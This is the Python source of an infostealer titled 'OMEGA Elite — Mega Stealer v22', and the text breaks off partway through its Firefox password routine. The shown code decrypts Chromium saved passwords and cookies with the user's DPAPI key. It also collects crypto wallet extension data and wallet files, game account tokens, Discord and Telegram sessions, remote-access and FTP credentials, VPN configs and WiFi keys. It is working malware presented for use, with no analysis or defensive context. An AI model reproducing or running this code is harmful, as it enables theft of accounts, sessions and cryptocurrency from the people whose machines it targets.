"""
OMEGA Elite — Mega Stealer v22
Targets: Games, Crypto, Apps, Browsers, Messengers, VPNs
"""
import os, json, base64, sqlite3, shutil, tempfile, glob, winreg, struct
from pathlib import Path
from typing import List, Dict, Any

LOCALAPPDATA = os.environ.get("LOCALAPPDATA", "")
APPDATA      = os.environ.get("APPDATA", "")
HOME         = str(Path.home())

# ─────────────────────────────────────────────────────────────────────────────
# CRYPTO KEY HELPER (Chrome-based AES-256-GCM decryption)
# ─────────────────────────────────────────────────────────────────────────────
def _get_master_key(browser_path: str):
    try:
        state_path = os.path.join(browser_path, "Local State")
        if not os.path.exists(state_path):
            return None
        with open(state_path, "r", encoding="utf-8", errors="ignore") as f:
            local_state = json.load(f)
        enc_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        enc_key = enc_key[5:]
        import ctypes, ctypes.wintypes
        class DATA_BLOB(ctypes.Structure):
            _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
        p = ctypes.create_string_buffer(enc_key, len(enc_key))
        blobin = DATA_BLOB(ctypes.sizeof(p), p)
        blobout = DATA_BLOB()
        retval = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
        if retval:
            return ctypes.string_at(blobout.pbData, blobout.cbData)
        return None
    except:
        return None

def _decrypt_value(value: bytes, master_key: bytes):
    try:
        if value[:3] == b'v10' or value[:3] == b'v11':
            from Crypto.Cipher import AES
            iv   = value[3:15]
            enc  = value[15:-16]
            tag  = value[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt_and_verify(enc, tag).decode("utf-8", errors="ignore")
        else:
            import ctypes, ctypes.wintypes
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
            p = ctypes.create_string_buffer(value, len(value))
            blobin = DATA_BLOB(ctypes.sizeof(p), p)
            blobout = DATA_BLOB()
            if ctypes.windll.crypt32.CryptUnprotectData(
                    ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout)):
                return ctypes.string_at(blobout.pbData, blobout.cbData).decode("utf-8", errors="ignore")
        return ""
    except:
        return ""

# ─────────────────────────────────────────────────────────────────────────────
# BROWSERS
# ─────────────────────────────────────────────────────────────────────────────
CHROMIUM_BROWSERS = {
    "Chrome":             os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"),
    "Edge":               os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"),
    "Brave":              os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"),
    "Opera":              os.path.join(APPDATA, "Opera Software", "Opera Stable"),
    "Opera GX":           os.path.join(APPDATA, "Opera Software", "Opera GX Stable"),
    "Vivaldi":            os.path.join(LOCALAPPDATA, "Vivaldi", "User Data"),
    "Chromium":           os.path.join(LOCALAPPDATA, "Chromium", "User Data"),
    "Yandex":             os.path.join(LOCALAPPDATA, "Yandex", "YandexBrowser", "User Data"),
    "Torch":              os.path.join(LOCALAPPDATA, "Torch", "User Data"),
    "Comodo Dragon":      os.path.join(LOCALAPPDATA, "Comodo", "Dragon", "User Data"),
    "Slimjet":            os.path.join(LOCALAPPDATA, "Slimjet", "User Data"),
    "7Star":              os.path.join(LOCALAPPDATA, "7Star", "7Star", "User Data"),
    "Iridium":            os.path.join(LOCALAPPDATA, "Iridium", "User Data"),
    "Epic Privacy":       os.path.join(LOCALAPPDATA, "Epic Privacy Browser", "User Data"),
    "Cent Browser":       os.path.join(LOCALAPPDATA, "CentBrowser", "User Data"),
    "Crefox":             os.path.join(LOCALAPPDATA, "CrBrowser", "User Data"),
    "360Chrome":          os.path.join(LOCALAPPDATA, "360Chrome", "Chrome", "User Data"),
    "Torch2":             os.path.join(LOCALAPPDATA, "Torch", "User Data"),
    "Atoms":              os.path.join(LOCALAPPDATA, "Atoms", "User Data"),
    "CocCoc":             os.path.join(LOCALAPPDATA, "CocCoc", "Browser", "User Data"),
    "CCleaner Browser":   os.path.join(LOCALAPPDATA, "CCleaner Browser", "User Data"),
    "Avast Browser":      os.path.join(LOCALAPPDATA, "AVAST Software", "Browser", "User Data"),
    "AVG Browser":        os.path.join(LOCALAPPDATA, "AVG", "Browser", "User Data"),
    "Samsung Internet":   os.path.join(LOCALAPPDATA, "Samsung", "SamsungBrowser", "User Data"),
}
GECKO_BROWSERS = {
    "Firefox":     os.path.join(APPDATA, "Mozilla", "Firefox", "Profiles"),
    "Thunderbird": os.path.join(APPDATA, "Thunderbird", "Profiles"),
    "Waterfox":    os.path.join(APPDATA, "Waterfox", "Profiles"),
    "Pale Moon":   os.path.join(APPDATA, "Moonchild Productions", "Pale Moon", "Profiles"),
    "Floorp":      os.path.join(APPDATA, "Floorp", "Profiles"),
    "LibreWolf":   os.path.join(LOCALAPPDATA, "LibreWolf", "Profiles"),
}

# ─────────────────────────────────────────────────────────────────────────────
# CRYPTO EXTENSION IDs
# ─────────────────────────────────────────────────────────────────────────────
CRYPTO_EXTENSIONS = {
    "MetaMask":            "nkbihfbeogaeaoehlefnkodbefgpgknn",
    "Trust Wallet":        "egjidjbpglichdcondbcbdnbeeppgdph",
    "Phantom (Solana)":    "bfnaelmomeimhlpmgjnjophhpkkoljpa",
    "Coinbase Wallet":     "hnfanknocfeofbddgcijnmhnfnkdnaad",
    "Ronin (Axie)":        "fnjhmkhhmkbjkkabndcnnogagogbneec",
    "Binance Chain":       "fhbohimaelbohpjbbldcngcnapndodjp",
    "Keplr (Cosmos)":      "dmkamcknogkgcdfhhbddcghachkejeap",
    "Sollet":              "fhmfendgdocmcbmfikdcogofphimnkno",
    "Terra Station":       "aiifbnbfobpmeekipheeijimdpnlpgpp",
    "Math Wallet":         "afbcbjpbpfadlkmhmclhkeeodmamcflc",
    "Coin98":              "aeachknmefphepccionboohckonoeemg",
    "TronLink":            "ibnejdfjmmkpcnlpebklmnkoeoihofec",
    "Nifty Wallet":        "jbdaocneiiinmjbjlgalhcelgbejmnid",
    "Liquality Wallet":    "kpfopkelmapcoipemfendmdcghnegimn",
    "MEW CX":              "nlbmnnijcnlegkjjpcfjclmcfggfefdm",
    "Jaxx Liberty":        "cjelfplplebdjjenllpjcblmjkfcffne",
    "iWallet":             "kncchdigobghenbbaddojjnnaogfppfj",
    "ZilPay":              "klnaejjgbibmhlephnhpmaofohgkpgkd",
    "Enkrypt":             "kkpllkodjeloidieedojogamigniodol",
    "OKX Wallet":          "mcohilncbfahbmgdjkbpemcciiolgcge",
    "Uniswap":             "haiffjcadagjlijoggckpgfnoeiflnem",
    "WalletConnect":       "gofhklgdnbnpcdigdgkgfobhhghjmmkj",
    "1inch":               "ookjlbkiijinhpmnjffcofjonbfbgaoc",
    "Rabby":               "acmacodkjbdgmoleebolmdjonilkdbch",
    "Civic":               "jbnkffmindojffecdhbbmekbmkkfpmjd",
    "Slope Finance":       "pocmplpaccanhmnllbbkpgfliimjljgo",
    "Glow":                "ojbcfhjmpigfobfclfflafhblgemeidi",
    "Solflare":            "bhhhlbepdkbapadjdnnojkbgioiodbic",
    "Braavos (StarkNet)":  "jnlgamecbpmbajjfhmmmlhejkemejdma",
    "ArgentX (StarkNet)":  "dlcobpjiigpikoobohmabehhmhfoodbb",
}

WALLET_PATHS = {
    "Bitcoin Core":         os.path.join(APPDATA, "Bitcoin", "wallets"),
    "Litecoin Core":        os.path.join(APPDATA, "Litecoin", "wallets"),
    "Electrum":             os.path.join(APPDATA, "Electrum", "wallets"),
    "Electron Cash":        os.path.join(APPDATA, "ElectronCash", "wallets"),
    "Electrum-LTC":         os.path.join(APPDATA, "Electrum-LTC", "wallets"),
    "Exodus":               os.path.join(APPDATA, "Exodus"),
    "Atomic Wallet":        os.path.join(APPDATA, "atomic", "Local Storage", "leveldb"),
    "Jaxx":                 os.path.join(APPDATA, "com.liberty.jaxx", "IndexedDB"),
    "Coinomi":              os.path.join(LOCALAPPDATA, "Coinomi", "Coinomi", "wallets"),
    "Wasabi Wallet":        os.path.join(LOCALAPPDATA, "WalletWasabi", "Client"),
    "Guarda Wallet":        os.path.join(LOCALAPPDATA, "Guarda", "Local Storage", "leveldb"),
    "Ledger Live":          os.path.join(APPDATA, "Ledger Live"),
    "Blockstream Green":    os.path.join(APPDATA, "Blockstream", "Green"),
    "Monero (GUI)":         os.path.join(HOME, "Documents", "Monero", "wallets"),
    "Ethereum Keystore":    os.path.join(APPDATA, "Ethereum", "keystore"),
    "MyEtherWallet":        os.path.join(LOCALAPPDATA, "MyEtherWallet"),
    "Zcash":                os.path.join(APPDATA, "Zcash", "wallets"),
    "Dash Core":            os.path.join(APPDATA, "DashCore", "wallets"),
    "Daedalus (Cardano)":   os.path.join(APPDATA, "Daedalus Mainnet"),
    "Trust Wallet Desktop": os.path.join(APPDATA, "Trust Wallet"),
    "Metamask Mobile Backup": os.path.join(LOCALAPPDATA, "metamask"),
}

# ─────────────────────────────────────────────────────────────────────────────
# GAMES
# ─────────────────────────────────────────────────────────────────────────────
def _get_steam_data() -> List[Dict]:
    results = []
    try:
        paths = [
            r"C:\Program Files (x86)\Steam",
            r"C:\Program Files\Steam",
            os.path.join(HOME, "Steam"),
        ]
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                 r"SOFTWARE\WOW6432Node\Valve\Steam")
            paths.insert(0, winreg.QueryValueEx(key, "InstallPath")[0])
            winreg.CloseKey(key)
        except: pass

        for steam_path in paths:
            if not os.path.exists(steam_path): continue

            login_file = os.path.join(steam_path, "config", "loginusers.vdf")
            if os.path.exists(login_file):
                with open(login_file, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                # Parse steamID blocks
                import re
                accounts = re.findall(
                    r'"(\d+)"\s*{([^}]+)}', content, re.DOTALL)
                for steamid, block in accounts:
                    name    = re.search(r'"AccountName"\s+"([^"]+)"', block)
                    persona = re.search(r'"PersonaName"\s+"([^"]+)"', block)
                    remember = re.search(r'"RememberPassword"\s+"(\d)"', block)
                    results.append({
                        "type": "Steam Account",
                        "steamid":   steamid,
                        "username":  name.group(1) if name else "",
                        "persona":   persona.group(1) if persona else "",
                        "remember":  remember.group(1) == "1" if remember else False,
                    })

            # Steam config -> web session cookies
            config_dir = os.path.join(steam_path, "config")
            for f in glob.glob(os.path.join(config_dir, "*.json")):
                try:
                    d = json.load(open(f, encoding="utf-8", errors="ignore"))
                    if "steamLoginSecure" in str(d):
                        results.append({
                            "type": "Steam Config",
                            "file": f,
                            "data": str(d)[:500]
                        })
                except: pass

            # ssfn auth files (2FA tokens)
            for ssfn in glob.glob(os.path.join(steam_path, "ssfn*")):
                results.append({"type": "Steam SSFN", "file": ssfn,
                                 "data": base64.b64encode(open(ssfn,"rb").read()).decode()})
            break
    except Exception as e:
        results.append({"type": "Steam Error", "error": str(e)})
    return results

def _get_epic_data() -> List[Dict]:
    results = []
    try:
        paths = [
            os.path.join(LOCALAPPDATA, "EpicGamesLauncher", "Saved", "Config"),
            os.path.join(LOCALAPPDATA, "EpicGamesLauncher", "Saved"),
        ]
        for p in paths:
            for ini in glob.glob(os.path.join(p, "*.json")) + glob.glob(os.path.join(p, "**", "*.json"), recursive=True):
                try:
                    content = open(ini, "r", encoding="utf-8", errors="ignore").read()
                    if any(k in content for k in ["token", "access_token", "refresh_token", "AccountId"]):
                        results.append({"type": "Epic Games Token", "file": os.path.basename(ini), "data": content[:800]})
                except: pass

        # Epic Games local credentials
        epic_cred = os.path.join(LOCALAPPDATA, "EpicGamesLauncher", "Saved", "Config", "Windows", "GameUserSettings.ini")
        if os.path.exists(epic_cred):
            results.append({"type": "Epic Settings", "data": open(epic_cred, encoding="utf-8", errors="ignore").read()[:500]})
    except Exception as e:
        results.append({"type": "Epic Error", "error": str(e)})
    return results

def _get_battlenet_data() -> List[Dict]:
    results = []
    try:
        bnet_paths = [
            os.path.join(APPDATA, "Battle.net"),
            os.path.join(LOCALAPPDATA, "Battle.net"),
        ]
        for p in bnet_paths:
            for f in glob.glob(os.path.join(p, "**", "*.db"), recursive=True) + \
                     glob.glob(os.path.join(p, "**", "*.json"), recursive=True):
                try:
                    content = open(f, "r", encoding="utf-8", errors="ignore").read()
                    if any(k in content for k in ["email", "token", "account", "saved"]):
                        results.append({"type": "Battle.net Data", "file": os.path.basename(f), "data": content[:500]})
                except: pass

        # Battle.net registry
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Blizzard Entertainment\Battle.net\Launch Options")
            i = 0
            while True:
                try:
                    name, value, _ = winreg.EnumValue(key, i)
                    results.append({"type": "Battle.net Registry", "key": name, "value": str(value)[:200]})
                    i += 1
                except OSError: break
        except: pass
    except Exception as e:
        results.append({"type": "Battle.net Error", "error": str(e)})
    return results

def _get_origin_ea_data() -> List[Dict]:
    results = []
    try:
        paths = [
            os.path.join(APPDATA, "Electronic Arts", "EA Desktop"),
            os.path.join(LOCALAPPDATA, "Electronic Arts", "EA Desktop"),
            os.path.join(HOME, "AppData", "Local", "Electronic Arts"),
        ]
        for p in paths:
            for ext in ["*.json", "*.xml", "*.cfg", "*.dat", "*.db"]:
                for f in glob.glob(os.path.join(p, "**", ext), recursive=True):
                    try:
                        content = open(f, "r", encoding="utf-8", errors="ignore").read()
                        if any(k in content.lower() for k in ["token", "password", "auth", "session", "email"]):
                            results.append({"type": "EA/Origin Data", "file": os.path.basename(f), "data": content[:500]})
                    except: pass
    except Exception as e:
        results.append({"type": "Origin Error", "error": str(e)})
    return results

def _get_ubisoft_data() -> List[Dict]:
    results = []
    try:
        paths = [
            os.path.join(LOCALAPPDATA, "Ubisoft Game Launcher"),
            os.path.join(LOCALAPPDATA, "Ubisoft Connect"),
        ]
        for p in paths:
            for ext in ["*.yml", "*.json", "*.dat"]:
                for f in glob.glob(os.path.join(p, "**", ext), recursive=True):
                    try:
                        content = open(f, "r", encoding="utf-8", errors="ignore").read()
                        if any(k in content for k in ["token", "user", "auth", "session"]):
                            results.append({"type": "Ubisoft Data", "file": os.path.basename(f), "data": content[:500]})
                    except: pass
    except Exception as e:
        results.append({"type": "Ubisoft Error", "error": str(e)})
    return results

def _get_riot_data() -> List[Dict]:
    results = []
    try:
        riot_path = os.path.join(APPDATA, "Riot Games")
        league_path= os.path.join(LOCALAPPDATA, "Riot Games", "Riot Client", "Data")
        for p in [riot_path, league_path]:
            for ext in ["*.json", "*.db", "*.yaml", "*.yml"]:
                for f in glob.glob(os.path.join(p, "**", ext), recursive=True):
                    try:
                        content = open(f, "r", encoding="utf-8", errors="ignore").read()
                        if any(k in content for k in ["token", "puuid", "access", "session"]):
                            results.append({"type": "Riot Games", "file": os.path.basename(f), "data": content[:500]})
                    except: pass

        # Lockfile (live session auth)
        lf = os.path.join(LOCALAPPDATA, "Riot Games", "Riot Client", "Config", "lockfile")
        if os.path.exists(lf):
            results.append({"type": "Riot Lockfile", "data": open(lf, encoding="utf-8", errors="ignore").read()})

    except Exception as e:
        results.append({"type": "Riot Error", "error": str(e)})
    return results

def _get_minecraft_data() -> List[Dict]:
    results = []
    try:
        mc_path = os.path.join(APPDATA, ".minecraft")
        accounts_file = os.path.join(mc_path, "launcher_accounts.json")
        if os.path.exists(accounts_file):
            results.append({"type": "Minecraft Accounts",
                            "data": open(accounts_file, encoding="utf-8", errors="ignore").read()[:1000]})
        for f in ["launcher_profiles.json", "authlib-injector.json"]:
            fp = os.path.join(mc_path, f)
            if os.path.exists(fp):
                results.append({"type": f"Minecraft {f}", "data": open(fp, encoding="utf-8", errors="ignore").read()[:500]})

        # Prism/MultiMC launchers
        for launcher in ["PrismLauncher", "MultiMC", "GDLauncher", "ATLauncher"]:
            lp = os.path.join(APPDATA, launcher)
            if os.path.exists(lp):
                for ext in ["*.json"]:
                    for fp in glob.glob(os.path.join(lp, "**", ext), recursive=True):
                        content = open(fp, "r", encoding="utf-8", errors="ignore").read()
                        if "accessToken" in content or "token" in content.lower():
                            results.append({"type": f"{launcher} Token", "data": content[:500]})
    except Exception as e:
        results.append({"type": "Minecraft Error", "error": str(e)})
    return results

def _get_rockstar_data() -> List[Dict]:
    results = []
    try:
        rockstar_paths = [
            os.path.join(LOCALAPPDATA, "Rockstar Games", "Launcher"),
            os.path.join(HOME, "Documents", "Rockstar Games"),
        ]
        for p in rockstar_paths:
            for ext in ["*.json", "*.cfg", "*.dat"]:
                for f in glob.glob(os.path.join(p, "**", ext), recursive=True):
                    try:
                        content = open(f, "r", encoding="utf-8", errors="ignore").read()
                        if any(k in content.lower() for k in ["token", "auth", "ticket", "session", "account"]):
                            results.append({"type": "Rockstar Data", "file": os.path.basename(f), "data": content[:500]})
                    except: pass
    except Exception as e:
        results.append({"type": "Rockstar Error", "error": str(e)})
    return results

def _get_gog_data() -> List[Dict]:
    results = []
    try:
        gog_path = os.path.join(LOCALAPPDATA, "GOG.com", "Galaxy", "storage")
        for ext in ["*.db", "*.json"]:
            for f in glob.glob(os.path.join(gog_path, "**", ext), recursive=True):
                try:
                    if f.endswith(".db"):
                        conn = sqlite3.connect(f)
                        for row in conn.execute("SELECT * FROM sqlite_master WHERE type='table'").fetchall():
                            try:
                                rows = conn.execute(f"SELECT * FROM [{row[1]}] LIMIT 5").fetchall()
                                if rows:
                                    results.append({"type": f"GOG DB/{row[1]}", "data": str(rows)[:500]})
                            except: pass
                        conn.close()
                except: pass
    except Exception as e:
        results.append({"type": "GOG Error", "error": str(e)})
    return results

# ─────────────────────────────────────────────────────────────────────────────
# CRYPTO WALLET STEALER
# ─────────────────────────────────────────────────────────────────────────────
def _get_crypto_extensions(browser_path: str) -> List[Dict]:
    results = []
    try:
        for name, ext_id in CRYPTO_EXTENSIONS.items():
            for profile in ["Default"] + [f"Profile {i}" for i in range(1, 8)]:
                ext_path = os.path.join(browser_path, profile, "Extensions", ext_id)
                if not os.path.exists(ext_path): continue

                # LevelDB local storage (where seeds are stored)
                ldb_path = os.path.join(browser_path, profile,
                                        "Local Extension Settings", ext_id)
                if os.path.exists(ldb_path):
                    for f in glob.glob(os.path.join(ldb_path, "*.ldb")) + \
                             glob.glob(os.path.join(ldb_path, "*.log")):
                        try:
                            raw = open(f, "rb").read()
                            text = raw.decode("utf-8", errors="ignore")
                            # Look for seed phrase patterns
                            results.append({
                                "type": f"Extension/{name}",
                                "file": os.path.basename(f),
                                "data": text[:2000]
                            })
                        except: pass
    except: pass
    return results

def _get_wallet_files() -> List[Dict]:
    results = []
    for wallet_name, wallet_path in WALLET_PATHS.items():
        if not os.path.exists(wallet_path): continue
        try:
            for f in glob.glob(os.path.join(wallet_path, "**", "*"), recursive=True):
                if not os.path.isfile(f): continue
                size = os.path.getsize(f)
                if size > 5 * 1024 * 1024: continue  # skip >5MB files
                try:
                    if f.endswith((".json", ".txt", ".dat", ".wallet", ".aes", ".key")):
                        content = open(f, "r", encoding="utf-8", errors="ignore").read()
                        results.append({"type": f"Wallet/{wallet_name}", "file": os.path.basename(f), "data": content[:1000]})
                    elif f.endswith((".ldb", ".log")):
                        raw = open(f, "rb").read()
                        results.append({"type": f"LDB/{wallet_name}", "file": os.path.basename(f), "data": raw.decode("utf-8", errors="ignore")[:1000]})
                except: pass
        except: pass
    return results

# ─────────────────────────────────────────────────────────────────────────────
# APPLICATIONS
# ─────────────────────────────────────────────────────────────────────────────
def _get_filezilla() -> List[Dict]:
    results = []
    try:
        paths = [
            os.path.join(APPDATA, "FileZilla", "sitemanager.xml"),
            os.path.join(APPDATA, "FileZilla", "recentservers.xml"),
            os.path.join(APPDATA, "FileZilla", "filezilla.xml"),
        ]
        for p in paths:
            if os.path.exists(p):
                results.append({"type": "FileZilla", "file": os.path.basename(p),
                                 "data": open(p, encoding="utf-8", errors="ignore").read()})
    except: pass
    return results

def _get_winscp() -> List[Dict]:
    results = []
    try:
        # WinSCP registry
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Martin Prikryl\WinSCP 2\Sessions")
        i = 0
        while True:
            try:
                session_name = winreg.EnumKey(key, i)
                sk = winreg.OpenKey(key, session_name)
                entry = {"type": "WinSCP Session", "name": session_name}
                for val in ["HostName", "UserName", "Password", "PortNumber", "Protocol"]:
                    try: entry[val] = winreg.QueryValueEx(sk, val)[0]
                    except: pass
                results.append(entry)
                winreg.CloseKey(sk)
                i += 1
            except OSError: break
        winreg.CloseKey(key)
    except: pass
    # INI file
    ini = os.path.join(HOME, "WinSCP.ini")
    if os.path.exists(ini):
        results.append({"type": "WinSCP INI", "data": open(ini, encoding="utf-8", errors="ignore").read()[:1000]})
    return results

def _get_putty() -> List[Dict]:
    results = []
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\SimonTatham\PuTTY\Sessions")
        i = 0
        while True:
            try:
                session_name = winreg.EnumKey(key, i)
                sk = winreg.OpenKey(key, session_name)
                entry = {"type": "PuTTY Session", "name": session_name}
                for val in ["HostName", "UserName", "PortNumber", "Protocol"]:
                    try: entry[val] = winreg.QueryValueEx(sk, val)[0]
                    except: pass
                results.append(entry)
                winreg.CloseKey(sk)
                i += 1
            except OSError: break
        winreg.CloseKey(key)
    except: pass
    return results

def _get_mremoteng() -> List[Dict]:
    results = []
    for path in [
        os.path.join(APPDATA, "mRemoteNG", "confCons.xml"),
        os.path.join(HOME, "Documents", "mRemoteNG", "confCons.xml"),
    ]:
        if os.path.exists(path):
            results.append({"type": "mRemoteNG Connections",
                            "data": open(path, encoding="utf-8", errors="ignore").read()[:2000]})
    return results

def _get_teamviewer() -> List[Dict]:
    results = []
    try:
        paths = [
            os.path.join(APPDATA, "TeamViewer"),
            os.path.join(LOCALAPPDATA, "TeamViewer"),
        ]
        for p in paths:
            for ext in ["*.ini", "*.conf", "*.db"]:
                for f in glob.glob(os.path.join(p, "**", ext), recursive=True):
                    content = open(f, "r", encoding="utf-8", errors="ignore").read()
                    if any(k in content.lower() for k in ["token", "session", "password", "server"]):
                        results.append({"type": "TeamViewer", "file": os.path.basename(f), "data": content[:500]})
        # Registry
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\TeamViewer")
        i = 0
        while True:
            try:
                name, value, _ = winreg.EnumValue(key, i)
                results.append({"type": "TeamViewer Registry", "key": name, "value": str(value)[:200]})
                i += 1
            except OSError: break
    except: pass
    return results

def _get_telegram() -> List[Dict]:
    results = []
    try:
        tg_paths = [
            os.path.join(APPDATA, "Telegram Desktop", "tdata"),
            os.path.join(LOCALAPPDATA, "Telegram Desktop", "tdata"),
        ]
        for tdata in tg_paths:
            if not os.path.exists(tdata): continue
            # Map auth keys
            for f in os.listdir(tdata):
                fp = os.path.join(tdata, f)
                if os.path.isfile(fp) and not f.endswith("s") and len(f) == 16:
                    size = os.path.getsize(fp)
                    if 100 < size < 100000:
                        results.append({
                            "type": "Telegram Session",
                            "file": f,
                            "data": base64.b64encode(open(fp, "rb").read()).decode()[:500]
                        })
    except: pass
    return results

def _get_discord_tokens() -> List[Dict]:
    results = []
    paths = {
        "Discord":      os.path.join(APPDATA, "discord", "Local Storage", "leveldb"),
        "Discord PTB":  os.path.join(APPDATA, "discordptb", "Local Storage", "leveldb"),
        "Discord Canary": os.path.join(APPDATA, "discordcanary", "Local Storage", "leveldb"),
        "Lightcord":    os.path.join(APPDATA, "Lightcord", "Local Storage", "leveldb"),
        "Discord Dev":  os.path.join(APPDATA, "discorddevelopment", "Local Storage", "leveldb"),
    }
    import re
    TOKEN_RE = re.compile(r"(mfa\.[a-zA-Z0-9_-]{84}|[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27})")

    for client, path in paths.items():
        if not os.path.exists(path): continue
        for f in glob.glob(os.path.join(path, "*.ldb")) + glob.glob(os.path.join(path, "*.log")):
            try:
                text = open(f, "rb").read().decode("utf-8", errors="ignore")
                for token in TOKEN_RE.findall(text):
                    results.append({"type": f"Discord Token/{client}", "token": token})
            except: pass
    return results

def _get_vpn_data() -> List[Dict]:
    results = []
    VPN_PATHS = {
        "NordVPN":      os.path.join(LOCALAPPDATA, "NordVPN"),
        "ExpressVPN":   os.path.join(LOCALAPPDATA, "ExpressVPN"),
        "ProtonVPN":    os.path.join(LOCALAPPDATA, "ProtonVPN"),
        "CyberGhost":   os.path.join(LOCALAPPDATA, "CyberGhost"),
        "Surfshark":    os.path.join(LOCALAPPDATA, "Surfshark"),
        "Mullvad":      os.path.join(LOCALAPPDATA, "Mullvad VPN"),
        "PIA":          os.path.join(LOCALAPPDATA, "Private Internet Access"),
        "IPVanish":     os.path.join(LOCALAPPDATA, "IPVanish"),
        "Windscribe":   os.path.join(LOCALAPPDATA, "Windscribe"),
    }
    for vpn, path in VPN_PATHS.items():
        if not os.path.exists(path): continue
        for ext in ["*.json", "*.dat", "*.cfg", "*.conf", "*.ini"]:
            for f in glob.glob(os.path.join(path, "**", ext), recursive=True):
                try:
                    content = open(f, "r", encoding="utf-8", errors="ignore").read()
                    if any(k in content.lower() for k in ["token", "username", "password", "auth", "session"]):
                        results.append({"type": f"VPN/{vpn}", "file": os.path.basename(f), "data": content[:500]})
                except: pass
    return results

def _get_anydesk_data() -> List[Dict]:
    results = []
    paths = [
        os.path.join(APPDATA, "AnyDesk"),
        os.path.join(LOCALAPPDATA, "AnyDesk"),
        r"C:\ProgramData\AnyDesk",
    ]
    for p in paths:
        for ext in ["*.conf", "*.dat", "*.trace"]:
            for f in glob.glob(os.path.join(p, "**", ext), recursive=True):
                try:
                    content = open(f, "r", encoding="utf-8", errors="ignore").read()
                    results.append({"type": "AnyDesk", "file": os.path.basename(f), "data": content[:500]})
                except: pass
    return results

def _get_wifi_passwords() -> List[Dict]:
    results = []
    try:
        import subprocess
        profiles_out = subprocess.check_output(
            "netsh wlan show profiles", shell=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        ).decode("utf-8", errors="ignore")
        import re
        profiles = re.findall(r"All User Profile\s*:\s*(.+)", profiles_out)
        for profile in profiles:
            profile = profile.strip()
            try:
                detail = subprocess.check_output(
                    f'netsh wlan show profile name="{profile}" key=clear',
                    shell=True, creationflags=subprocess.CREATE_NO_WINDOW
                ).decode("utf-8", errors="ignore")
                passwd = re.search(r"Key Content\s*:\s*(.+)", detail)
                results.append({
                    "type": "WiFi Password",
                    "ssid": profile,
                    "password": passwd.group(1).strip() if passwd else "(hidden / no key)"
                })
            except: pass
    except Exception as e:
        results.append({"type": "WiFi Error", "error": str(e)})
    return results

def _get_outlook_data() -> List[Dict]:
    results = []
    try:
        import re
        for profile_root in [r"Software\Microsoft\Office\16.0\Outlook\Profiles",
                              r"Software\Microsoft\Office\15.0\Outlook\Profiles",
                              r"Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles"]:
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, profile_root)
                i = 0
                while True:
                    try:
                        profile_name = winreg.EnumKey(key, i)
                        results.append({"type": "Outlook Profile", "name": profile_name})
                        i += 1
                    except OSError: break
            except: pass

        # PST / OST files
        for root, dirs, files in os.walk(HOME):
            for f in files:
                if f.endswith(".pst") or f.endswith(".ost"):
                    results.append({"type": "Outlook Data File", "path": os.path.join(root, f)})
    except Exception as e:
        results.append({"type": "Outlook Error", "error": str(e)})
    return results

# ─────────────────────────────────────────────────────────────────────────────
# BROWSER PASSWORDS & COOKIES  (Chromium-based)
# ─────────────────────────────────────────────────────────────────────────────
def _chromium_passwords(browser_name: str, browser_path: str) -> List[Dict]:
    results = []
    try:
        master_key = _get_master_key(browser_path)
        for profile in ["Default"] + [f"Profile {i}" for i in range(1, 8)]:
            login_db = os.path.join(browser_path, profile, "Login Data")
            if not os.path.exists(login_db): continue
            temp = os.path.join(tempfile.gettempdir(), f"__{browser_name}_{profile}_ld.db")
            shutil.copy2(login_db, temp)
            try:
                conn = sqlite3.connect(temp)
                for row in conn.execute("SELECT origin_url, username_value, password_value FROM logins"):
                    url, user, enc_pass = row
                    pw = _decrypt_value(enc_pass, master_key) if master_key else "??"
                    if user or pw:
                        results.append({
                            "type": f"Password/{browser_name}",
                            "url": url, "username": user, "password": pw
                        })
                conn.close()
            except: pass
            finally:
                try: os.remove(temp)
                except: pass
    except: pass
    return results

def _chromium_cookies(browser_name: str, browser_path: str) -> List[Dict]:
    results = []
    try:
        master_key = _get_master_key(browser_path)
        for profile in ["Default"] + [f"Profile {i}" for i in range(1, 8)]:
            cookie_db = os.path.join(browser_path, profile, "Network", "Cookies")
            if not os.path.exists(cookie_db):
                cookie_db = os.path.join(browser_path, profile, "Cookies")
            if not os.path.exists(cookie_db): continue
            temp = os.path.join(tempfile.gettempdir(), f"__{browser_name}_{profile}_ck.db")
            shutil.copy2(cookie_db, temp)
            try:
                conn = sqlite3.connect(temp)
                for row in conn.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies LIMIT 500"):
                    host, name, enc_val, _ = row
                    val = _decrypt_value(enc_val, master_key) if master_key else ""
                    results.append({
                        "type": f"Cookie/{browser_name}",
                        "host": host, "name": name, "value": val[:200]
                    })
                conn.close()
            except: pass
            finally:
                try: os.remove(temp)
                except: pass
    except: pass
    return results

def _gecko_passwords(browser_name: str, profile_root: str) -> List[Dict]:
    results = []
    try:
        if not os.path.exists(profile_root): return results
        for profile in os.listdir(profile_root):
            pp = os.path.join(profile_root, profile)
            logins_file = os.path.join(pp, "logins.json")
            if not os.path.exists(logins_file): continue
            data = json.load(open(logins_file, encoding="utf-8", errors="ignore"))
            for login in data.get("logins", []):
                results.append({
                    "type": f"Password/{browser_name}",
                    "url":      login.get("formSubmitURL", ""),
                    "username": login.get("encryptedUsername", "(encrypted)"),
                    "password": login.get("encryptedPassword", "(encrypted)"),
